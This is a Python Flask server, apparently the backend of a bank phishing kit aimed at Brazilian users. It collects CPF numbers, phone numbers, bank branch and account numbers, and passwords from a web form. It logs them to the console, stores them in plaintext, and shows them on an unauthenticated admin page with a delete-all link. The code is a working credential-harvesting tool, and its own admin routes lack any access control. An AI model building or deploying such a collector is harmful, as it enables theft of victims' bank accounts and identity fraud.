from flask import Flask, request, jsonify, send_from_directory
import csv
import datetime
import json
import os
import sqlite3
import psycopg2
from psycopg2.extras import RealDictCursor

app = Flask(__name__, static_folder=".")

# Configuração de banco
DATABASE_URL = os.environ.get('DATABASE_URL')
USE_POSTGRES = DATABASE_URL is not None

if USE_POSTGRES:
    DB_PATH = None  # Usará PostgreSQL
else:
    DB_PATH = 'dados.db'  # SQLite local para desenvolvimento


def init_db():
    """Inicializa o banco de dados."""
    if USE_POSTGRES:
        conn = psycopg2.connect(DATABASE_URL)
        cursor = conn.cursor()
        cursor.execute(
            '''
            CREATE TABLE IF NOT EXISTS registros (
                id SERIAL PRIMARY KEY,
                timestamp TEXT,
                cpf TEXT,
                telefone TEXT,
                agencia TEXT,
                conta TEXT,
                senha TEXT
            )
            '''
        )
        conn.commit()
        conn.close()
    else:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute(
            '''
            CREATE TABLE IF NOT EXISTS registros (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                cpf TEXT,
                telefone TEXT,
                agencia TEXT,
                conta TEXT,
                senha TEXT
            )
            '''
        )
        conn.commit()
        conn.close()


# inicializa o banco sempre que o servidor é iniciado
init_db()

# rota para salvar dados
@app.route('/api/save-form', methods=['POST'])
def save_form():
    if request.is_json:
        data = request.get_json()
    else:
        data = request.form.to_dict()

    # aceitar tanto 'cpf' quanto 'CPF' (alguns scripts usam letras maiúsculas)
    cpf = data.get('cpf') or data.get('CPF') or ''
    telefone = data.get('telefone') or data.get('Telefone') or ''
    agencia = data.get('agencia') or data.get('Agencia') or ''
    conta = data.get('conta') or data.get('Conta') or ''
    senha = data.get('senha') or data.get('Senha') or ''

    print("📥 Dados recebidos:", data)
    print("CPF:", cpf)
    print("Telefone:", telefone)
    print("Agencia:", agencia)
    print("Conta:", conta)
    print("Senha:", senha)

    # evita gravar entradas vazias
    if not cpf and not telefone and not agencia and not conta and not senha:
        return jsonify({"status": "empty"}), 200

    # salva no banco
    if USE_POSTGRES:
        conn = psycopg2.connect(DATABASE_URL)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO registros (timestamp, cpf, telefone, agencia, conta, senha) VALUES (%s, %s, %s, %s, %s, %s)",
            (datetime.datetime.utcnow().isoformat() + 'Z', cpf, telefone, agencia, conta, senha)
        )
        conn.commit()
        conn.close()
    else:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO registros (timestamp, cpf, telefone, agencia, conta, senha) VALUES (?, ?, ?, ?, ?, ?)",
            (datetime.datetime.utcnow().isoformat() + 'Z', cpf, telefone, agencia, conta, senha)
        )
        conn.commit()
        conn.close()

    return jsonify({"status": "ok"}), 200


# rota para visualizar dados (admin)
@app.route('/admin')
def admin():
    if USE_POSTGRES:
        conn = psycopg2.connect(DATABASE_URL)
        cursor = conn.cursor(cursor_factory=RealDictCursor)
        cursor.execute("SELECT * FROM registros ORDER BY id")
        rows = cursor.fetchall()
        conn.close()
    else:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM registros ORDER BY id")
        rows = cursor.fetchall()
        conn.close()

    html = "<html><body><h1>Dados Registrados</h1><table border='1'>"
    html += "<tr><th>ID</th><th>Timestamp</th><th>CPF</th><th>Telefone</th><th>Agencia</th><th>Conta</th><th>Senha</th></tr>"
    for row in rows:
        if USE_POSTGRES:
            html += f"<tr><td>{row['id']}</td><td>{row['timestamp']}</td><td>{row['cpf']}</td><td>{row['telefone']}</td><td>{row['agencia']}</td><td>{row['conta']}</td><td>{row['senha']}</td></tr>"
        else:
            html += f"<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[3]}</td><td>{row[4]}</td><td>{row[5]}</td><td>{row[6]}</td></tr>"
    html += "</table><br><a href='/admin/delete'>Apagar todos os dados</a></body></html>"
    return html


# rota para apagar dados
@app.route('/admin/delete')
def delete_data():
    if USE_POSTGRES:
        conn = psycopg2.connect(DATABASE_URL)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM registros")
        conn.commit()
        conn.close()
    else:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM registros")
        conn.commit()
        conn.close()
    return "Dados apagados! <a href='/admin'>Voltar</a>"


# serve arquivos do front
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')


@app.route('/<path:path>')
def static_files(path):
    return send_from_directory('.', path)


if __name__ == '__main__':
    app.run(debug=True)